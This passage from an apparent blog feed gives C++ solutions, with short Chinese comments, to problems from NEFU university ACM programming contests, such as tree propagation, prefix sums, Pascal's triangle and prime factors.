class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">2e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br><span class="hljs-type">int</span> to;<br><span class="hljs-type">int</span> next;<br>&#125;edge;<br><br>edge e[MAXN];<br><span class="hljs-type">int</span> cur=<span class="hljs-number">1</span>,head[MAXN],vis[MAXN];<br>ll value[MAXN];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> u,<span class="hljs-type">int</span> v)</span><br>&#123;<br>e[cur].to=v;<br>e[cur].next=head[u];<br>head[u]=cur++;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u)</span><br>&#123;<br>vis[u]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=head[u];i!=<span class="hljs-number">0</span>;i=e[i].next)<br>&#123;<br><span class="hljs-type">int</span> v=e[i].to;<br><span class="hljs-keyword">if</span>(vis[v])<span class="hljs-keyword">continue</span>;<br>value[v]+=value[u];<br>dfs(v);<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n,m;<br><span class="hljs-built_in">cin</span>&gt;&gt;n&gt;&gt;m;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-type">int</span> u,v;<br><span class="hljs-built_in">cin</span>&gt;&gt;u&gt;&gt;v;<br>add(u,v);<br>add(v,u);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>&#123;<br>ll u,d;<br><span class="hljs-built_in">cin</span>&gt;&gt;u&gt;&gt;d;<br>value[u]+=d;<br>&#125;<br>dfs(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>i==<span class="hljs-number">1</span>?<span class="hljs-built_in">cout</span>&lt;&lt;value[i]:<span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;value[i];<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="C-xx玩游戏"><a href="#C-xx玩游戏" class="headerlink" title="C.xx玩游戏"></a>C.xx玩游戏</h1><p>找到规律，偶数列没有必败态，奇数列有（n+1）&#x2F;2个必败态</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> t;<br><span class="hljs-built_in">cin</span>&gt;&gt;t;<br><span class="hljs-keyword">while</span>(t--)<br>&#123;<br>ll n;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;n);<br>ll t=(n+<span class="hljs-number">1</span>)/<span class="hljs-number">2</span>;<br>ll lose=(<span class="hljs-number">1</span>+t)*t/<span class="hljs-number">2</span>;<br>ll sum=(<span class="hljs-number">1</span>+n)*n/<span class="hljs-number">2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld\n&quot;</span>, sum-lose);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="D-xx的零食店-待补"><a href="#D-xx的零食店-待补" class="headerlink" title="D. xx的零食店(待补)"></a>D. xx的零食店(待补)</h1><h1 id="E-qyh的签到题"><a href="#E-qyh的签到题" class="headerlink" title="E.qyh的签到题"></a>E.qyh的签到题</h1><p>跟去年校赛大一的一道题神似…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> n,q;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> ll;<br><span class="hljs-type">const</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> mod=<span class="hljs-number">1e9</span>+<span class="hljs-number">7</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN=<span class="hljs-number">1e5</span>+<span class="hljs-number">5</span>;<br>ll d1[MAXN],d2[MAXN],d3[MAXN];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pre_sum</span><span class="hljs-params">(ll d[])</span><br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br>d[i]+=d[i<span class="hljs-number">-1</span>];<br>d[i]%=mod;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n, &amp;q);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;q;i++)<br>&#123;<br><span class="hljs-type">int</span> type,pos;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>, &amp;type, &amp;pos);<br><span class="hljs-keyword">if</span>(type==<span class="hljs-number">1</span>)d1[pos]++;<br><span class="hljs-keyword">if</span>(type==<span class="hljs-number">2</span>)d2[pos]++;<br><span class="hljs-keyword">if</span>(type==<span class="hljs-number">3</span>)<br>&#123;<br>d3[pos]++;<br>d3[pos+<span class="hljs-number">1</span>]++;<br>&#125;<br>&#125;<br>pre_sum(d3);pre_sum(d3);pre_sum(d3);<br>pre_sum(d2);pre_sum(d2);<br>pre_sum(d1);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br>i==<span class="hljs-number">1</span>?<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, (d1[i]+d2[i]+d3[i])%mod):<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; %lld&quot;</span>, (d1[i]+d2[i]+d3[i])%mod);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="G-天哥的序列"><a href="#G-天哥的序列" class="headerlink" title="G.天哥的序列"></a>G.天哥的序列</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFU15届校赛-大一组</title>
      <link href="/2020/12/ba287589.html"/>
      <url>/2020/12/ba287589.html</url>
      
        <content type="html"><![CDATA[<h1 id="A-三角形面积"><a href="#A-三角形面积" class="headerlink" title="A. 三角形面积"></a>A. 三角形面积</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">double</span> a,b,c;<br>    <span class="hljs-type">double</span> ans,p,tmp;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>    p=(a+b+c)*<span class="hljs-number">0.5</span>;<br>    tmp=p*(p-a)*(p-b)*(p-c);<br>    ans=<span class="hljs-built_in">sqrt</span>(tmp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.1lf&quot;</span>, ans);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><span id="more"></span><h1 id="B-最大质因子"><a href="#B-最大质因子" class="headerlink" title="B. 最大质因子"></a>B. 最大质因子</h1><blockquote><p><em><strong>唯一分解定理</strong></em></p><p>唯一分解定理又称为算数基本定理，基本内容是：</p><p>每个大于1的自然数，要么本身就是质数，要么可以写为2个或以上的质数的积，而且这些质因子按大小排列之后，写法仅有一种方式。</p><p>用另一种方法表示就是：</p><p>对于任何一个大于1的正整数,都存在一个标准的分解式: N&#x3D;p1^a1 * p2^a2<em>···</em>pn^an;（其中一系列an为指数，pn为质数）</p><p>此定理表明：任何一个大于 1 的正整数都可以表示为素数的积。</p></blockquote><p>然而这道题纯暴力就可解…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">judge</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span><br>&#123;<br>    <span class="hljs-type">int</span> flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i*<span class="hljs-number">2</span>&lt;=a;i++)<br>     <span class="hljs-keyword">if</span> (a%i==<span class="hljs-number">0</span>) &#123;flag=<span class="hljs-number">0</span>; <span class="hljs-keyword">break</span>; &#125;<br>    <span class="hljs-keyword">if</span> (a==<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a;<br>   <span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;a)<br>   &#123;<br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=a;i&gt;=<span class="hljs-number">1</span>;i--)<br>       &#123;<br>           <span class="hljs-keyword">if</span> (a%i==<span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">if</span> (judge(i))<br><br>           &#123;<br>               <span class="hljs-built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="hljs-built_in">endl</span>;<br>               <span class="hljs-keyword">break</span>;<br>           &#125;<br>       &#125;<br>   &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="C-杨辉三角"><a href="#C-杨辉三角" class="headerlink" title="C.杨辉三角"></a>C.杨辉三角</h1><p>模板例题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> a[<span class="hljs-number">21</span>][<span class="hljs-number">21</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">memset</span>(a, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(a));<br>a[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=<span class="hljs-number">1</span>;<br>a[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>]=a[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>]=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> n;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">3</span>;i&lt;=n;i++)<span class="hljs-comment">//行 </span><br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(j==<span class="hljs-number">1</span> || j==i)<br>&#123;<br>a[i][j]=<span class="hljs-number">1</span>;<span class="hljs-keyword">continue</span>;<br>&#125;<br>a[i][j]=a[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+a[i<span class="hljs-number">-1</span>][j];<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>&#123;<br><span class="hljs-built_in">cout</span>&lt;&lt;a[i][j]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;<span class="hljs-built_in">endl</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="D-”nefu”的数目"><a href="#D-”nefu”的数目" class="headerlink" title="D.”nefu”的数目"></a>D.”nefu”的数目</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-built_in">string</span> s;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">scount</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span><br>&#123;<br><span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> len=s.length();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=p+<span class="hljs-number">1</span>;i&lt;len;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;e&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;len;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(s[j]==<span class="hljs-string">&#x27;f&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=j+<span class="hljs-number">1</span>;k&lt;len;k++)<br>&#123;<br><span class="hljs-keyword">if</span>(s[k]==<span class="hljs-string">&#x27;u&#x27;</span>)sum++;<br><span class="hljs-comment">//cout&lt;&lt;sum&lt;&lt;endl;</span><br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> sum;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>,flag=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;s;<br><span class="hljs-type">int</span> len=s.length();<br><span class="hljs-comment">//cout&lt;&lt;len;</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;n&#x27;</span>)<br>&#123;<br>    ans+=scount(i);<br>&#125;<br>            <span class="hljs-comment">//cout&lt;&lt;ans&lt;&lt;endl;</span><br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="hljs-built_in">endl</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="E-最少修改次数-1"><a href="#E-最少修改次数-1" class="headerlink" title="E. 最少修改次数(1)"></a>E. 最少修改次数(1)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">2e5</span>+<span class="hljs-number">10</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br> <span class="hljs-built_in">string</span> s,t;<br>   <span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;s)<br>   &#123;<br>       <span class="hljs-built_in">cin</span>&gt;&gt;t;<br>       <span class="hljs-type">int</span> ct=<span class="hljs-number">0</span>;<br>       <span class="hljs-type">int</span> nums=s.size(),numt=t.size();<br>       <span class="hljs-type">int</span> min=<span class="hljs-number">1111</span>;<br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=nums-numt;i++)<br>       &#123;<br>           <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>           ct=<span class="hljs-number">0</span>;<br>           <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=i;k&lt;=i+numt<span class="hljs-number">-1</span>;k++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (s[k]!=t[j]) ct++;<br>                j++;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (ct&lt;min) min=ct;<br>       &#125;<br><br>       <span class="hljs-built_in">cout</span>&lt;&lt;min&lt;&lt;<span class="hljs-built_in">endl</span>;<br>   &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="F-字典序"><a href="#F-字典序" class="headerlink" title="F.字典序"></a>F.字典序</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">2e5</span>+<span class="hljs-number">10</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n;<br>  <span class="hljs-keyword">while</span>(<span class="hljs-built_in">cin</span>&gt;&gt;n)<br>  &#123;<br>     <span class="hljs-built_in">string</span> s1,s,max=<span class="hljs-string">&quot;0&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>     &#123;<br>       <span class="hljs-type">int</span> m=i;<br>       s.clear();s1.clear();<br>       <span class="hljs-keyword">while</span>(m!=<span class="hljs-number">0</span>)<br>        &#123;<br>         s+=m%<span class="hljs-number">8</span>+<span class="hljs-string">&#x27;0&#x27;</span>;<br>         m/=<span class="hljs-number">8</span>;<br>        &#125;<br>       <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j=s.size()<span class="hljs-number">-1</span>;j&gt;=<span class="hljs-number">0</span>;j--)<br>       &#123;<br>           s1+=s[j];<br>   &#125;<br>        <span class="hljs-keyword">if</span> (s1&gt;max) max=s1;<br>     &#125;<br>    <span class="hljs-built_in">cout</span>&lt;&lt;max&lt;&lt;<span class="hljs-built_in">endl</span>;<br>  &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="G-最小差值"><a href="#G-最小差值" class="headerlink" title="G.最小差值"></a>G.最小差值</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">2e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[maxn];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> n,tot=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">cin</span>&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-built_in">cin</span>&gt;&gt;a[i];<br>tot+=a[i];<br>&#125;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> sum=<span class="hljs-number">0</span>,ans=<span class="hljs-number">999999</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> com;<br>sum+=a[i];<br>com=tot-sum;<br>ans=min(ans, <span class="hljs-built_in">abs</span>(com-sum));<br>&#125;<br><span class="hljs-built_in">cout</span>&lt;&lt;ans;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="H-染色方案（待补）"><a href="#H-染色方案（待补）" class="headerlink" title="H.染色方案（待补）"></a>H.染色方案（待补）</h1><h1 id="I-最大正方形"><a href="#I-最大正方形" class="headerlink" title="I.最大正方形"></a>I.最大正方形</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 